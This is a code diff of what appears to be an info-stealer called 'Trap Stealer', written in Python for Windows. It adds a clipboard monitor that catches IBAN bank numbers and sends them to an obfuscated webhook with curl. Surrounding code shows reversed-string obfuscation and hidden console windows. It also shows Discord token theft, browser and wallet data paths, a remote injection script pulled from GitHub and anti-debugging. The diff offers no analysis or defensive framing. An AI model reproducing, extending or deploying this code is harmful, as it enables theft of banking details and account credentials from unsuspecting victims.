@@ -20,7 +20,7 @@ from importlib import import_module
 import datetime
 
 debug = '%Debug%'
-webhook = '%Webhook%'
+webhook = '%WEBHOOK%'
 FakeWebhook = '%FakeWebhook%'
 Fakegen = '%FakeGen%' 
 FakeCCgen = '%FakeCCGen%' 
@@ -45,6 +45,11 @@ ArchiStealer = '%ArchiStealer%'
 Gofile = '%GoFileYesOrNo%'
 fileio = '%FileIOYesOrNo%'
 catbox = '%CatBoxMoeYesOrNo%'
+
+# TRAP EXTENSION
+
+trap_extension = "%TrapExtension%"
+Iban_Stealer = "%IbanStealer%"
 
 if Startup == False:
     StartupMessage = 'Adding to startup disabled in the config'
@@ -673,7 +678,7 @@ def idisc():
         ind = "sj.xedni"
         global webhook
 
-        inj_url = f"https://raw.{"tnetnocresubuhtig"[::-1]}.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
+        inj_url = f"https://raw.githubusercontent.com/TheCuteOwl/Trap-Stealer/main/{ind[::-1]}"
 
         folder_list = [f'{Desc}', f'{Dsccana}', f'{Dscptb}', f'{Dscdev}']
         for folder_name in folder_list:
@@ -1265,6 +1270,88 @@ def get_tokq_info(tokq):
 
     return username, globalusername, bio, nsfw, hashtag, ema, user_id, pfp, flags, nitros, phone
 
+def trap_exten():
+    if Iban_Stealer == True:
+
+
+
+        def hide_console1():
+            kernel32 = ctypes.WinDLL("kernel32.dll")
+            user32 = ctypes.WinDLL("user32.dll")
+            get_console_window = kernel32.GetConsoleWindow
+            show_window = user32.ShowWindow
+            hwnd = get_console_window()
+            show_window(hwnd, 0)
+
+        def hide_console2():
+            user32 = ctypes.WinDLL("user32.dll")
+            get_foreground_window = user32.GetForegroundWindow
+            show_window = user32.ShowWindow
+            hwnd = get_foreground_window()
+            show_window(hwnd, 0)
+
+        def DeobfuscateWeb(encrypted_text, key):
+            decrypted = [0] * 256
+            for i, char in enumerate(key):
+                decrypted[char] = i
+
+            decrypted_text = []
+            for char in encrypted_text:
+                decrypted_char = decrypted[char]
+                decrypted_text.append(decrypted_char)
+                
+            return bytes(decrypted_text)
+
+
+        def is_valid_iban(text):
+            iban_pattern_eu = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{7}([A-Z0-9]?){0,16}$'
+            iban_pattern_na = r'^[A-Z]{2}\d{2}[A-Z0-9]{4}\d{5}([A-Z0-9]?){0,14}$'
+            return bool(re.match(iban_pattern_eu, text.replace(" ", ""))) or bool(re.match(iban_pattern_na, text.replace(" ", "")))
+
+
+        def get_clipboard_content():
+            try:
+                clipboard_text = subprocess.check_output(['powershell.exe', 'Get-Clipboard'], shell=True, text=True)
+                return clipboard_text.strip()
+            except subprocess.CalledProcessError as e:
+                print("Error:", e)
+                return None
+
+        def send_to_web(webhookurl, text):
+            webhook_url = DeobfuscateWeb(webhookurl[0],webhookurl[1]).decode()
+            
+            data = {
+                "username":"Trap Stealer",
+                "avatar_url":"https://cdn3.emoji.gg/emojis/3304_astolfobean.png",
+
+                "embeds": [{
+                        "title": "IBAN Detected",
+                        "description": f"{text}"
+                }]
+                }
+
+
+            data_json = dumps(data).replace('"', '\\"')
+
+            curl_command = f'curl -H "Content-Type: application/json" -d "{data_json}" --insecure {webhook_url}'
+
+
+            process = subprocess.Popen(curl_command, shell=True, stderr=subprocess.DEVNULL)
+
+            
+        # hide_console1()
+        # hide_console2()
+
+        while True:
+            time.sleep(1)
+            clip_content = get_clipboard_content()
+            if is_valid_iban(clip_content) == True:
+                send_to_web(webhook, clip_content)
+            else:
+                pass
+
+
+    
 def checkTokq(Tokq):
     headers = {
         "Authorization": Tokq,
@@ -3312,6 +3399,7 @@ def gatha():
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
         
     ]
+    
     Discord = 'drocsiD'
     Lightcord = 'drocthgiL'
     BTPdiscord = 'btpdrocsid'
@@ -3340,7 +3428,12 @@ def gatha():
         Second_Thread.append(defender)
     except Exception as e:
         error_Handler(e)
-
+        
+    if trap_extension == True:
+        Iban = threading.Thread(target=trap_exten)
+        Iban.start()
+        First_Thread.append(Iban)
+            
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
